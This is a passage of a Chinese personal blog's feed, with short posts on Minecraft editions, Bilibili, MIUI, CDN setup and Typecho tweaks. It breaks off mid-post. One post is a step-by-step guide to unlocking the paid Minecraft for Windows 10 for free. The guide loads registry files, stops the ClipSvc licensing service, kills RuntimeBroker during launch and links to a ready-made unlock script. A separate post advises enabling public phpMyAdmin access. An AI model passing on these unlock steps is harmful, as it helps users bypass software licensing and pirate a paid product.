    <content type="html"><![CDATA[<p>Minecraft版本主要分<br>Java版 Java Edition JE<br>基岩版 Bedrock Edition BE  </p><p>还有携带版 Pocket Edition PE 已经被基岩版取代<br>Windows10版就是基岩版<br>教育版就是基岩版<br>各主机版一般是基岩版，或者有专门区分<br>各设备VR版一般是Java版，或者有专门区分  </p><p>安卓谷歌商店的是基岩版<br>Windows10微软商店的是基岩版<br>网易&#x2F;中国版电脑客户端Java版基岩版都有，手机客户端只有基岩版  </p><p>Java版可以用各种启动器启动(PCL&#x2F;HMCL&#x2F;官方)可以离线启动(离线启动不修改游戏本体或验证机制等，官方启动器断网时也支持离线启动)<br>进入多人游戏有验证机制，离线模式在有正版验证机制的多人游戏会提示无效回话  </p><p>基岩版可以购买Minecoins在市场兑换组件、皮肤等。联机直接与Xbox好友用Xbox服务器联机。<br>基岩版进入多人游戏没有验证机制，但没有离线模式等，只有试玩。有盗版，这个盗版通常是修改了游戏本体或相关验证机制。盗版和正版体验几乎一样，服务器都能进、钱都能充、成就系统在线</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Minecraft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lua语言真的优雅</title>
    <link href="/archives/331/"/>
    <url>/archives/331/</url>
    
    <content type="html"><![CDATA[<p>Lua语言真的好优雅，比如</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ok <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>就像自然语言一样流畅</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Lua</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>B站支持杜比视界</title>
    <link href="/archives/326/"/>
    <url>/archives/326/</url>
    
    <content type="html"><![CDATA[<p>B站支持杜比视界了 【B站可以投稿杜比视界了！听说这是全球首家？!-哔哩哔哩】&lt;<a href="https://b23.tv/av589936965/p1">https://b23.tv/av589936965/p1</a><div class="note note-light">            <p>这个体验视频免费</p>          </div><br>眼睛耳朵的感受：声音听不出区别 (比起A站的 JoySound) ；一些字像加了一层锐化；色彩区别不大。</p><p>眼睛手感受的缺点：手机烫的厉害；画面动起来比1080p+还糊，码率很低；然后是感觉色彩一片一片的；宽容度很低，暗的地方一坨黑。</p><p>总结：期待后续优化 (就是个垃圾)</p><p>环境：Xiaomi Redmi K30 5G (8+128)arm64-v8a&#x2F;Android 11(API 30)&#x2F;MIUI 12.5 21.8.3&#x2F;Blilbili 6.38.0 User999&#x2F;哔哩漫游 1.4.6 User 0&#x2F;空调27°C 设备打开视频前电池35°C 观看视频后电池42°C 测试环境不严谨</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>哔哩哔哩</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIUI圣经</title>
    <link href="/archives/318/"/>
    <url>/archives/318/</url>
    
    <content type="html"><![CDATA[<p>原视频 <a href="https://www.bilibili.com/video/BV1v44y1k7f8">大家来看彩虹猫_哔哩哔哩_bilibili</a> MIUI开发版踢人，八年米粉声泪俱下控诉小米MIUI小米社区<br>备份<br><a href="https://wwe.lanzoui.com/iqWuGsrlk7i">https://wwe.lanzoui.com/iqWuGsrlk7i</a><br>xml弹幕+flv视频</p><p>hhhhhc<br>解决不了问题就解决提出问题的人<br>MIUI圣经</p><p>评论区的备份链接也没了</p><p>弹幕录屏版<br><a href="https://www.bilibili.com/video/BV1LQ4y1m7du">https://www.bilibili.com/video/BV1LQ4y1m7du</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MIUI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>特殊的日子</title>
    <link href="/archives/299/"/>
    <url>/archives/299/</url>
    
    <content type="html"><![CDATA[<p>今天是个特殊的日子（</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PR崩了</title>
    <link href="/archives/295/"/>
    <url>/archives/295/</url>
    
    <content type="html"><![CDATA[<p>愉 快 的 一 天</p><p><img src="https://z3.ax1x.com/2021/08/17/fhHKZd.png" alt="PR崩了"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>哔哩哔哩</tag>
      
      <tag>视频</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIX4防丢无卡联网</title>
    <link href="/archives/275/"/>
    <url>/archives/275/</url>
    
    <content type="html"><![CDATA[<p>“无卡联网”服务违反了国家工信部的 “一卡一实名” 规定，如果未通过运营商实名管理的虚拟SIM卡被恶意利用，将会对国内互联网的运营管理造成很大影响。</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小米</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>win11更新时时间预估</title>
    <link href="/archives/266/"/>
    <url>/archives/266/</url>
    
    <content type="html"><![CDATA[<p><img src="https://z3.ax1x.com/2021/08/13/fBbNQK.png"></p><p>win11更新时会有时间预估</p><p>这个好哎，挺实用的，希望不要砍了</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIUI启动应用过快</title>
    <link href="/archives/262/"/>
    <url>/archives/262/</url>
    
    <content type="html"><![CDATA[<p>MIUI变成现在这样子，这种人功不可没</p><p><img src="https://pb.nichi.co/cherry-glory-rack"></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MIUI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杰出兽适配新域名/网站</title>
    <link href="/archives/225/"/>
    <url>/archives/225/</url>
    
    <content type="html"><![CDATA[<p>杰出兽安卓app正在适配新域名&#x2F;网站 已经适配了！！！！ 欢迎下载</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杰出兽动态更新</title>
    <link href="/archives/214/"/>
    <url>/archives/214/</url>
    
    <content type="html"><![CDATA[<p>杰出兽动态双叒叒更新了 以后保持这种形式 最早的杰出兽动态备份：<a href="https://wwe.lanzoui.com/iXLXVrlt48j">https://wwe.lanzoui.com/iXLXVrlt48j</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>世界，您好！</title>
    <link href="/archives/1/"/>
    <url>/archives/1/</url>
    
    <content type="html"><![CDATA[<p>欢迎使用WordPress。这是您的第一篇文章。编辑或删除它，然后开始写作吧！</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>免费用CDN加速你的网站-海内外自动分流</title>
    <link href="/archives/44/"/>
    <url>/archives/44/</url>
    
    <content type="html"><![CDATA[<h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>众所周知 <em>CDN</em> - <em>Content Delivery Network</em> - <em>内容分发网络</em> 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><div class="note note-light">            <p>这里应该有个很高大上的图片,但我懒 ･ω･｀)</p>          </div><h2 id="CDN的好处都有啥"><a href="#CDN的好处都有啥" class="headerlink" title="CDN的好处都有啥"></a>CDN的好处都有啥</h2><p>CDN是在用户与服务器中的一个中继 有了CDN之后。访问者会通过域名解析到CDN服务器（而不是你的网站的服务器），CDN再向服务器请求，服务器再发送回应给CDN，CDN再回应用户 那加速又从何而来呢？这样不是绕远路了嘛？ <em>首先</em> 事实上并不是用户的每次请求 CDN都会向服务器请求，CDN通常会缓存下服务器的内容，只向访问者提供缓存的内容。 <em>其次</em> CDN一般能减少公网上不必要的转发。 <em>而且</em> 你的网站服务器如果只有一台，只在一个地方，那么离这台服务器物理位置较远的地方，网站速度就多少会慢一点。CDN则通常会在各地有许多节点服务器，用户会就近连接CDN节点。 <em>还有</em> 如果你恰好财力雄厚有不止一台服务器，那么CDN也可以配置负载均衡，自动调配服务器资源。 CDN还可以隐藏服务器的真实IP起到保护网站安全，因为域名解析到的是CDN服务器，而不是你的网站服务器。</p><h2 id="免费的CDN"><a href="#免费的CDN" class="headerlink" title="免费的CDN"></a>免费的CDN</h2><p>目前个人使用主流的免费CDN有<a href="https://www.cloudflare.com/"><em>CloudFlare</em></a>和<a href="https://su.baidu.com/"><em>百度云加速</em></a> CloudFlare 免费用户的提供的节点都在海外，所以国内通常只能起到减速的作用，但是它的安全保护做的不错</p><div class="note note-light">            <p>CloudFlare is fast in the world except in China</p>          </div><p>百度云加速 <em>优点</em> 节点数量说是6-12 <strong>CloudFlare 国内免费就没节点，海外也只能接到1-2个</strong> 免费支持CNAME解析 支持自有SSL证书 <strong>CloudFlare 只能用它送你的经常出问题的证书</strong> 也许能优化在百度的SEO <em>缺点</em> 需要你的域名和服务器已备案 安全防护方面功能不多，好像连人机验证都没 不提供用户地理位置分布 <strong>虽然 CloudFlare 也只是按国家分</strong> 免费证书限制20个 <strong>CloudFlare 没看见有写</strong> 流量10G&#x2F;天 <strong>CloudFlare 原则上无限制</strong> 单节点吞吐量限制700 <strong>CloudFlare 没看见有写</strong> CC攻击保护峰值吞吐量限制2000 <strong>CloudFlare 没看到有写</strong> DDOS攻击保护峰值限制5G <strong>CloudFlare 原则上无限制 写了自己服务器能吃67T</strong></p><div class="note note-light">            <p>说百度云加速和 CloudFlare 合作,就是一个东西的 请把百度的“时间不限”改成“一个月内”</p>          </div><p>两者的功能确实非常相似，但百度云加速确实只在境内快； CloudFlare 确实只在境外快。</p><h2 id="配置境内外自动分流"><a href="#配置境内外自动分流" class="headerlink" title="配置境内外自动分流"></a>配置境内外自动分流</h2><p>有没有办法境内外自动分流不同的CDN呢？ 我们可以用阿里云DNS的智能ISP设置结合CNAME 在 百度云加速 和 CloudFlare 都绑定、验证域名，只用设置连接到你网站服务器的几个解析 百度云加速免费支持CNAME方式，但 CloudFlare 不支持，但我们可以用一个第三方的管理平台 cdn.wzfou.com 来操作DNS并复制CNAME</p><div class="note note-light">            <p>之前已经在 CloudFlare 有域名的要先删了，在这个平台上添加 安全性未知，也不知道啥时候跑路</p>          </div><p>把域名的DNS服务器设置到阿里云</p><div class="note note-light">            <p>别的应该也行</p>          </div><p>设置一些其他的解析，比如邮箱 设置接入CDN的CNAME解析，百度云加速 ISP设置默认；CloudFlare ISP设置海外 <img src="https://z3.ax1x.com/2021/07/21/Wdfd8U.png" alt="所有 DNS 解析记录"></p><div class="note note-light">            <p>百度云加速支持自有SSL证书，你可以把证书设成一样的，不过 CloudFlare 送的证书真的动不动出问题</p>          </div><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><div class="note note-light">            <p>使用 17CE ping</p>          </div><p><em>阿里云CDN（16￥&#x2F;100G&#x2F;1年 还没什么功能的那种）</em> <img src="https://img.vim-cn.com/c5/aaae4d92380f758623aa1c3571585bca9ef078.png" alt="阿里云CDN - 非常快"> <img src="https://img.vim-cn.com/dd/a1495ea988dbe90ff97084e5a032ca12cbbf51.png" alt="阿里云CDN - 非常快"> <em>直连IP</em> <img src="https://img.vim-cn.com/2b/3d700ce6677da664f9b630c07925041cc6dfea.jpg" alt="直连IP - 快"> <img src="https://img.vim-cn.com/95/cbe847a59426c73a2c406f407baa666a096dfe.jpg" alt="直连IP - 快"> <em>自动分流</em> <img src="https://img.vim-cn.com/64/07a3d15d05a8a3e387a9d2163068247e8725e9.png" alt="自动分流 - 较快"> <img src="https://img.vim-cn.com/13/2a98087efaec0466eda44197e7eabab52995b8.png" alt="自动分流 - 较快"> <em>只用 CloudFlare</em> <img src="https://img.vim-cn.com/ea/c267de2c5787eac9565c4631c6a3dc12f8589e.png" alt="CloudFlare - 非常慢"> <img src="https://img.vim-cn.com/de/97b0c5b3541f44591bbb139c0239fd05e861d6.png" alt="CloudFlare - 非常慢"> <em>只用 百度云加速</em> <img src="https://img.vim-cn.com/b8/e7463877bc1c2f885844ddd46606196040c69b.png" alt="百度云加速 - 海外慢"> <img src="https://img.vim-cn.com/a8/1b0e8fc2143d55a7e143fb8ca8280948d602d0.png" alt="百度云加速 - 海外慢"></p><div class="note note-light">            <p>自己看完这篇文章感觉字好多，图好少。配置教程部分没啥内容，不过确实挺简单的啦</p>          </div>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>免费解锁 Minecraft for Windows10 （MCBE）</title>
    <link href="/archives/42/"/>
    <url>/archives/42/</url>
    
    <content type="html"><![CDATA[<div class="note note-warning">            <p>解锁方法有更新<br><strong>查看 <a href="https://www.jiecs.top/archives/764">https://www.jiecs.top/archives/764</a></strong></p>          </div><h2 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明"></a>一些说明</h2><p><em>安全性与方法来源</em><br>注册表文件及方法能够找到的最早来源 <a href="https://youtu.be/l7Z-JNa2LSs">Youtube</a><br>作者有说明“Don’t make video about this step”但这是帮助文档不是视频XD<br>一键bat脚本由本人-杰出兽编写，Windows 下你可以右键–&gt;编辑查看bat脚本的全部源代码</p><p><em>环境要求</em><br>一般有 Microsoft 应用商店的系统、未购买 Minecraft for Windows10 的正常的微软账号即可<br>精简优化版系统也许不行<br>测试环境Windows 10 专业版 21H1</p><p><em>已知缺陷与后果</em><br>无法在游戏中打开充值 Minecoins 跳转窗口，不过你可以直接在 Microsoft 应用商店购买 Minecoins ，而且市场中免费的内容还是可以获取下载<br>激活后将无法使用 Microsoft 应用商店的开始下载功能–卡在“正在获取许可”，你可以在关闭游戏后恢复（我写了自动脚本来完成这一切）<br>每次启动游戏需要手动结束 Runtime Broker.exe 进程（我写了自动脚本来完成这一切）</p><h2 id="安装-Minecraft-for-Windows10-试用版"><a href="#安装-Minecraft-for-Windows10-试用版" class="headerlink" title="安装 Minecraft for Windows10 试用版"></a>安装 Minecraft for Windows10 试用版</h2><div class="note note-light">            <p>已经装了就跳过</p>          </div><p>打开 Microsoft 应用商店，搜索找到 Minecraft for Windows10</p><div class="note note-light">            <p>不要打开什么新手收藏、大师系列啥的，那是捆绑包，没有试用版</p>          </div><p>下载安装试用版<br><img src="https://z3.ax1x.com/2021/07/11/W9u0R1.jpg" alt="试玩版 Minecraft"></p><p>打开一次 Minecraft for Windows10 后关掉<br><img src="https://z3.ax1x.com/2021/07/11/W9KDYj.jpg" alt="Minecraft 需要解锁完整版"><br>可以看到没有解锁</p><h2 id="解锁方式一：使用我的一键脚本（推荐）"><a href="#解锁方式一：使用我的一键脚本（推荐）" class="headerlink" title="解锁方式一：使用我的一键脚本（推荐）"></a>解锁方式一：使用我的一键脚本（推荐）</h2><p><a href="http://ctpan.jiecs.top/#/f/32856022-514339363-37de0d?p=6968">下载我的一键脚本（MFWL）</a></p><p>（访问码：6968）</p><h2 id="一键脚本小白教程"><a href="#一键脚本小白教程" class="headerlink" title="一键脚本小白教程"></a>一键脚本小白教程</h2><p>你只需要参考上面的教程安装 Minecraft for Windows10 的试玩版，然后解压我的一键脚本，双击打开里面的 Minecraft Windows10 快捷方式即可<br>你可以把快捷方式拖动放到桌面上，这样就可以在桌面上打开 Minecraft for Windows10<br><img src="https://z3.ax1x.com/2021/07/11/W9nehR.gif" alt="相当简单，对吧" title="相当简单，对吧"></p><p>通常情况下，MFWL 会自动完成全部操作，你可以正常游玩游戏，正常退出游戏</p><div class="note note-light">            <p>不通常的情况应该…不多…吧…</p>          </div><p>如果没有错误，不应对 MFWL 命令处理程序（黑乎乎的窗口）进行任何操作。即使它提示你“按一个键继续”，这也包括游戏中，而且退出游戏后稍等片刻 MFWL 也会自动执行操作并退出</p><h2 id="一键脚本常规教程"><a href="#一键脚本常规教程" class="headerlink" title="一键脚本常规教程"></a>一键脚本常规教程</h2><p><em>文件说明</em><br>解压后打开 Minecraft For Windows10 Launcher 文件夹<br><img src="https://z3.ax1x.com/2021/07/11/W98w7V.png" alt="压缩包内的文件"></p><p><strong>Launcher.bat</strong><br>将自动打开 Minecraft for Windows10 并结束 RuntimeBroker.exe 进程，通过它打开游戏在解锁后就不用每次启动游戏都手动结束 Runtime Broker.exe 进程</p><p><strong>Minecraft.lnk</strong><br>Minecraft for Windows10 的快捷方式，由于 bat 批处理程序不能直接打开 UWP应用，所以只能打开这个快捷方式</p><p><strong>Minecraft_For_Windows10-180x180.ico</strong><br>是 Minecraft for Windows10 的图标，从官网收集 .webp 后转换为 180x180 的 .ico 图标，你可以为 bat 批处理程序创建快捷方式后使用此图标</p><p><strong>Minecraft_OFF.reg &amp; Minecraft_ON.reg</strong><br>原作者的注册表解锁&#x2F;恢复文件，解锁&#x2F;恢复过程会调用此文件</p><p><strong>Unlock.bat</strong><br>为解锁&#x2F;恢复提供一键操作</p><p><strong>UnlockLauncher.bat</strong><br>全自动解锁、恢复脚本，文件夹外面的快捷方式就是指向这个脚本。退出游戏后恢复原样，可以在 Microsoft 应用商店下载应用。但是因为启动前需要先解锁，启动速度比先用 Unlock.bat 解锁，然后用 Launcher.bat 启动要慢，而且游戏过程中不能关闭脚本，会每十秒检测一次游戏有没有退出，退出游戏后会恢复原样</p><p><em>颜色说明</em><br>命令处理程序中代码颜色<br><img src="https://z3.ax1x.com/2021/07/11/W97ElT.png" alt="五彩斑斓的命令行"></p><p><strong>深黑</strong><br>命令处理程序背景</p><p><strong>青蓝</strong><br>你应该操作&#x2F;头说明文字</p><p><strong>亮白</strong><br>你输入的内容</p><p><strong>橙黄</strong><br>你应该忽略的内容&#x2F;程序内部内容</p><p><strong>绿色</strong><br>操作成功&#x2F;状态1</p><p><strong>红色</strong><br>发送错误&#x2F;状态2</p><p><em>操作说明</em><br>需要操作时按照说明操作</p><div class="note note-light">            <p>我真的不觉得需要更详细的操作说明了</p>          </div><h2 id="解锁方式二：一般方式"><a href="#解锁方式二：一般方式" class="headerlink" title="解锁方式二：一般方式"></a>解锁方式二：一般方式</h2><h2 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h2><p><em>加载注册表并停止服务</em><br>先下载注册表文件<br>Minecraft On: <a href="https://www.mediafire.com/file/bzk844sozlrr45c/Minecraft+ON.reg/file">https://www.mediafire.com/file/bzk844sozlrr45c/Minecraft+ON.reg/file</a><br>Minecraft Off: <a href="https://www.mediafire.com/file/lj6n04v17ir1pss/Minecraft+OFF.reg/file">https://www.mediafire.com/file/lj6n04v17ir1pss/Minecraft+OFF.reg/file</a></p><div class="note note-light">            <p>这里放的是原作者的文件链接，你也可以在我的一键脚本（MFWL）压缩包中获取这两个注册表文件</p>          </div><p>双击打开下载的 Minecraft ON.reg 点击“是”“确定”以加载注册表<br><img src="https://z3.ax1x.com/2021/07/11/W9lnO0.png" alt="确定加载注册表"></p><p>然后按 Ctrl+Shift+Esc 打开任务管理器，上方切换到服务选项卡<br>找到 ClipSvc 右键–&gt;停止<br><img src="https://z3.ax1x.com/2021/07/11/W9l71s.png" alt="ClipSvc 服务"></p><p><em>启动游戏并结束 Runtime Broker.exe</em><br>以正常方式重新打开 Minecraft for Windows10<br>启动时进度应当会卡在 46%<br>这时按 Ctrl+Shift+Esc 打开任务管理器，进程选项卡中–&gt;应用找到 Minecraft，点击左边的小三角展开<br>选择 Runtime Broker 点击右下结束进程<br><img src="https://z3.ax1x.com/2021/07/11/W91sET.png" alt="Runtime Broker 进程"><br>这时 Minecraft for Windows10 应当正常启动并处于解锁状态</p><h2 id="取消解锁（恢复原样）"><a href="#取消解锁（恢复原样）" class="headerlink" title="取消解锁（恢复原样）"></a>取消解锁（恢复原样）</h2><p>参考上面的内容，不过是打开 Minecraft OFF.reg 并开始 ClipSvc</p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>FusionApp-所有网页都是客户端</title>
    <link href="/archives/41/"/>
    <url>/archives/41/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>FusionApp(简称:FA)是一款新概念”网页转应用”的应用，使用简单方便。<br>它提倡将网页中的组件元素删除，并使用安卓原生组件替代，以此获得良好的交互体验并让整个网页焕然一新，就像真的客户端一样。<br>它提出UI模板制，您可对照需要转应用的网页，选取合适的UI模板，进行定制。提供许多方便开发的辅助功能。<br>当前FA最新版本1.1.4。它还有最新的2.0beta版，不过还在测试，而且工程文件不互通</p><h2 id="FusionApp安装"><a href="#FusionApp安装" class="headerlink" title="FusionApp安装"></a>FusionApp安装</h2><p>FusionApp使用几乎无门槛，你可以直接<a href="https://www.coolapk.com/apk/cn.coldsong.fusionapp">在酷安下载FusionApp的1.1.4版本。</a>不过我更推荐你使用“<a href="https://wwe.lanzoui.com/iVG4hpimc7e">FA-重制版</a>”这里放的是1.5.5版本。FA-重制版自带腾讯X5内核，可以方便的切换，打包时可以添加混淆&#x2F;加密，附带许多实用功能</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>创建新的工程，可以选择各种模板，需要注意的是这模板创建后不可修改<br>工程编辑页面右上角主要是运行程序和打包apk<br>页面分三个板块“配置”“组件”“属性”</p><p>“属性”页主要编辑程序基本数据(1)、程序子页面(3)、程序代码(4)</p><p>其中网页控制、全局Js脚本可以隐藏网页元素，以替换为软件原生组件，元素屏蔽相关可以使用<a href="https://www.coolapk.com/apk/com.Yyge.JsHD">JsHD调试器</a>获取。</p><p>许多按钮组件隐藏，替换为软件原生组件</p><p>FA程序代码基于AndroLua语言，可以百度获取相关教程。推荐安装<a href="https://wwe.lanzoui.com/ieEYVping7e">ALua手册</a>，查询方便。</p><p>“组件”页可以添加程序各种组件，编辑图标和触发事件</p><p>“属性”页调整基于模板的各个组件颜色大小图标等</p><h2 id="还有"><a href="#还有" class="headerlink" title="还有"></a>还有</h2><p>本站软件就是用FA编写，而且你可以<a href="https://www.jiecs.xyz/index.php/app.html">获取源码</a></p>]]></content>
    
    
    <categories>
      
      <category>简单技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>让你的博客支持Emoji?</title>
    <link href="/archives/40/"/>
    <url>/archives/40/</url>
    
    <content type="html"><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>首先，<a href="https://t.jiecs.xyz/index.php/archives/8/">之前我就想过让博客支持Emoji</a>，折腾半天懒得搞了，现在重新搞</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>首先你应该尝试你的phpMyAdmin能否正常管理<br><img src="https://www.jiecs.xyz/usr/uploads/2021/04/1393339740.jpg" alt="IMG_20210428_205715.jpg" title="IMG_20210428_205715.jpg"><br>点击“管理”查看能否打开新标签<br>如果可以则跳过“准备”</p><div class="note note-light">            <p>我的phpMyAdmin不能正常打开管理，经过这通操作就可以了，高度玄学。一般情况下这个操作会让你服务器更安全**<em>说实话我也不知道有啥影响，还是不要乱动好</em>**</p>          </div><p><img src="https://i.loli.net/2021/04/28/cvj9xwa1I4kWdJf.jpg" alt="IMG_20210428_205716.jpg" title="IMG_20210428_205716.jpg"><br>宝塔面板–&gt;安全–&gt;SSH安全管理</p><p><img src="https://i.loli.net/2021/04/28/5D2xUV7L1qPFIHO.jpg" alt="IMG_20210428_210640.jpg" title="IMG_20210428_210640.jpg"><br>密钥管理–&gt;关闭密码登录,打开密钥登录</p><p>首页–&gt;软件–&gt;phpMyAdmin<br><img src="https://i.loli.net/2021/04/28/X3Cps4feiPKDAcT.jpg" alt="IMG_20210428_210855.jpg" title="IMG_20210428_210855.jpg"><br>启用公共访问权限–&gt;打开链接</p><h2 id="数据库配置文件操作"><a href="#数据库配置文件操作" class="headerlink" title="数据库配置文件操作"></a>数据库配置文件操作</h2><p>在宝塔文件的网站根目录中，有一个config.inc.php的文件，点击编辑。在如下位置修改’utf8’–&gt;’utf8mb4’</p><p>保存</p><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><div class="note note-light">            <p>数据无价，谨慎操作</p>          </div><p>首页–&gt;软件–&gt;phpMyAdmin</p><p>启用公共访问权限–&gt;打开链接<br><img src="https://www.jiecs.xyz/usr/uploads/2021/04/1512148079.jpg" alt="IMG_20210428_211109.jpg" title="IMG_20210428_211109.jpg"><br>不要管错误，输入用户名和密码<br><img src="https://www.jiecs.xyz/usr/uploads/2021/04/1273422298.jpg" alt="IMG_20210428_214734.jpg" title="IMG_20210428_214734.jpg"><br>粘贴</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">alter table typecho_comments convert to character <span class="hljs-built_in">set</span> utf8mb4 collate utf8mb4_general_ci;<br>alter table typecho_contents convert to character <span class="hljs-built_in">set</span> utf8mb4 collate utf8mb4_general_ci;<br>alter table typecho_fields convert to character <span class="hljs-built_in">set</span> utf8mb4 collate utf8mb4_general_ci;<br>alter table typecho_metas convert to character <span class="hljs-built_in">set</span> utf8mb4 collate utf8mb4_general_ci;<br>alter table typecho_options convert to character <span class="hljs-built_in">set</span> utf8mb4 collate utf8mb4_general_ci;<br>alter table typecho_relationships convert to character <span class="hljs-built_in">set</span> utf8mb4 collate utf8mb4_general_ci;<br>alter table typecho_users convert to character <span class="hljs-built_in">set</span> utf8mb4 collate utf8mb4_general_ci;<br></code></pre></td></tr></table></figure><p>过程中的错误全部忽略</p><p><img src="https://www.jiecs.xyz/usr/uploads/2021/04/1747496968.jpg" alt="IMG_20210428_215529.jpg" title="IMG_20210428_215529.jpg"><br>差不多这样，有点不一样问题不大</p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>?????????????????❤️???????✌️?</p><div class="note note-light">            <p>相关链接</p>          </div><p><a href="https://blog.csdn.net/qq_16763983/article/details/110790066">https://blog.csdn.net/qq_16763983&#x2F;article&#x2F;details&#x2F;110790066</a></p>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>方便地切换跳转网站</title>
    <link href="/archives/34/"/>
    <url>/archives/34/</url>
    
    <content type="html"><![CDATA[<h2 id="前面"><a href="#前面" class="headerlink" title="前面"></a>前面</h2><p>众所周知，我的网站分主站<a href="http://jiecs.xyz/"><em>杰出兽的小宇宙</em></a>和分站<a href="http://t.jiecs.xyz/"><em>杰出兽动态</em></a>可是目前来看分站-杰出兽动态几乎无人访问，似乎主站也没人访问<br>为了让分站更容易被看到，网站添加了醒目的切换按钮</p><h2 id="创建自定义模板"><a href="#创建自定义模板" class="headerlink" title="创建自定义模板"></a>创建自定义模板</h2><div class="note note-light">            <p>这个按钮基于Typecho-独立页面-自定义模板实现</p>          </div><p>打开[网站]&#x2F;usr&#x2F;themes&#x2F;[主题]新建一个custom.php</p><div class="note note-light">            <p>文件名无所谓，部分主题自带二次创作”自定义模板”模板，可换文件名以保存源文件</p>          </div><p>粘贴以下内容，[ ] 内容自定义填写</p><div class="note note-light">            <p>你可以直接修改“独页跳转”自定义模板名<br>我不会码代码，都是cv语言+小小的修改，你肯定能做到更精简更快</p>          </div><p>保存上传</p><h2 id="创建独立页面-按钮"><a href="#创建独立页面-按钮" class="headerlink" title="创建独立页面&#x2F;按钮"></a>创建独立页面&#x2F;按钮</h2><p>创建独立页面，名称、短链&#x2F;Sulg 自选<br>自定义模版选择独页跳转</p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>挺不错的</p><div class="note note-light">            <p>相关链接</p>          </div><p><a href="https://m.qqdie.com/archives/jump-to-an-article.html">https://m.qqdie.com/archives/jump-to-an-article.html</a><br><a href="https://m.php.cn/article/473492.html">https://m.php.cn/article/473492.html</a></p>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个问题的解决</title>
    <link href="/archives/38/"/>
    <url>/archives/38/</url>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>前几天发现我网站没了，打不开</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>第一时间想到租房的路由器url玄学限制问题，可切流量后仍没有什么变化<br>然后想到CDN&#x2F;DNS解析问题，尝试访问<a href="https://t.jiecs.xyz/">分站</a>，可以访问<br>又尝试在网址前添加www头</p><div class="note note-light">            <p>即原jiecs.xyz；现<a href="http://www.jiecs.xyz/">www.jiecs.xyz</a></p>          </div><p>可以访问</p><p>但这格式是怎么回事？？<br>因为绝大css&#x2F;图片都以原网址请求</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>好吧，总之就是CDN&#x2F;DNS解析,就是Cloudflare&#x2F;阿里云DNS问题<br>那百度谷歌搜搜看？</p><p>彳于吧，自己再研究</p><h2 id="回顾"><a href="#回顾" class="headerlink" 